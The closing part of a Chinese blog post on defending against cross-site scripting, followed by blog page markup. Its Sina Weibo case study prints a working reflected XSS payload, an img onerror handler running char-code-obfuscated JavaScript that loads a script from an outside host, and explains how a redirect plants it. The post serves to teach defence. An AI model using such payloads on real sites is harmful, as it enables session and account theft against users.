+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// e=document.createElement("script");e.src="http://a.xxx.xyz/book.weibo.js",document.documentElement.appendChild(e)</span></span><br><span class="line"><span class="comment">// 将上面的转换为 char code 的形式</span></span><br><span class="line"><span class="comment">// 完整 URL 如下</span></span><br><span class="line">http:<span class="comment">//a.xxx.xyz/?a=&lt;img src=1 onerror=eval(String.fromCharCode(101,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,101,46,115,114,99,61,34,104,116,116,112,58,47,47,97,46,122,104,99,104,98,105,110,46,120,121,122,47,98,111,111,107,46,119,101,105,98,111,46,106,115,34,44,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,97,112,112,101,110,100,67,104,105,108,100,40,101,41))&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>请求后我们的服务器会重定向跳转到<code>http://book.weibo.com/newcms/i/weibo_send.php</code>，这时候的 <code>error.referer</code> 就会被我们植入 XSS 攻击脚本了。</p>
+</li>
+</ol>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>可以看到，大多数漏洞都是处于绕来绕去最后发现漏洞的地方没有进行过滤转义处理。正所谓 <strong>攻击千万条，安全第一条。过滤不规范，开发两行泪。</strong></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">跨站脚本 - 维基百科，自由的百科全书</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting" target="_blank" rel="noopener">跨站脚本攻击(Cross-site scripting) - 术语表 | MDN</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">内容安全策略( CSP ) - HTTP | MDN</a></li>
+<li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS" target="_blank" rel="noopener">Cross-site Scripting (XSS)</a>)</li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>我只是试下能不能被赞赏😳</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://bbucket-1257297990.cos.ap-guangzhou.myqcloud.com/IMG_4838.jpg" alt="Lucius WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="https://bbucket-1257297990.cos.ap-guangzhou.myqcloud.com/171226222918.png" alt="Lucius Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>    
+     
+     
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+              <strong>本文作者：</strong>Lucius
+          </li>
+          <li class="post-copyright-link">
+            <strong>本文链接：</strong>
+            <a href="/2019/06/30/archivers/web-secure-xss/" title="Web 安全防御战 - 浅谈XSS">2019/06/30//archivers/web-secure-xss/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明： </strong>
+            本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！
+          </li>
+        </ul>
+      
+    </div>
+    
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/http/" rel="tag"># http</a>
+          
+            <a href="/tags/web-secure/" rel="tag"># web-secure</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/17/archivers/about-webpack/" rel="next" title="Webpack 之常见的见招拆招">
+                <i class="fa fa-chevron-left"></i> Webpack 之常见的见招拆招
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/30/archivers/http-introduction/" rel="prev" title="HTTP 入门体检">
+                HTTP 入门体检 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+      <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-7371507374872885"
+     data-ad-slot="4569151502"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="gitalk-container"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="Lucius" />
+          <p class="site-author-name" itemprop="name">Lucius</p>
+          <p class="site-description motion-element" itemprop="description">stay hungry, stay foolish...</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">57</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Lucius0" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Cross-Site-Scripting"><span class="nav-number">1.</span> <span class="nav-text">XSS(Cross Site Scripting)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反射型XSS"><span class="nav-number">1.1.</span> <span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#存储型XSS"><span class="nav-number">1.2.</span> <span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM-型-XSS"><span class="nav-number">1.3.</span> <span class="nav-text">DOM 型 XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见-XSS-注入点"><span class="nav-number">1.4.</span> <span class="nav-text">常见 XSS 注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见危害"><span class="nav-number">1.5.</span> <span class="nav-text">常见危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见防御方法"><span class="nav-number">1.6.</span> <span class="nav-text">常见防御方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实战-amp-amp-案例"><span class="nav-number">2.</span> <span class="nav-text">实战 &amp;&amp; 案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实战"><span class="nav-number">2.1.</span> <span class="nav-text">实战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#案例"><span class="nav-number">2.2.</span> <span class="nav-text">案例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#案例1-有道云笔记分享出现-XSS-攻击漏洞"><span class="nav-number">2.2.1.</span> <span class="nav-text">案例1 有道云笔记分享出现 XSS 攻击漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#案例2-新浪微博反射型-XSS"><span class="nav-number">2.2.2.</span> <span class="nav-text">案例2 新浪微博反射型 XSS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">2.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lucius</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+<div class="busuanzi-count">
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv"><i class="fa fa-user"></i> 访问人数<span class="busuanzi-value" id="busuanzi_value_site_uv"></span></span>
+  
+
+  
+    <span class="site-pv"><i class="fa fa-eye"></i> 总访问量<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>次</span>
+  
+  
+</div>
+
+
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: 'c35834931d268e5c17c6',
+          clientSecret: 'c80a4f57c98a6cf8d87e0c7d306201814a0dc745',
+          repo: 'lucius0.github.io',
+          owner: 'lucius0',
+          admin: ['lucius0'],
+          id: location.pathname,
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+  <script type="text/javascript">
+    (function() {
+      // try {
+      //   var document = window.document;
+      //   document.oncontextmenu = function() {
+      //     return false;
+      //   }
+      //   document.onkeydown = function() {
+      //     if (window.event.ctrlKey && window.event.keyCode == 67) {
+      //       return false;
+      //     }
+      //     return false;
+      //   }
+      //   document.body.oncopy = function() {
+      //     return false;
+      //   }
+      //   document.onselectstart = function() {
+      //     return false;
+      //   }
+            
+      //   document.onselectstart=function(){return false};
+      //   // document.style.MozUserSelect && document.style.MozUserSelect="none";
+      //   document.onmousedown=function(){return false};
+      //   document.style.cursor = "default"; 
+      // } catch(e) {}
+    })();
+  </script>
+
+</body>
+</html>
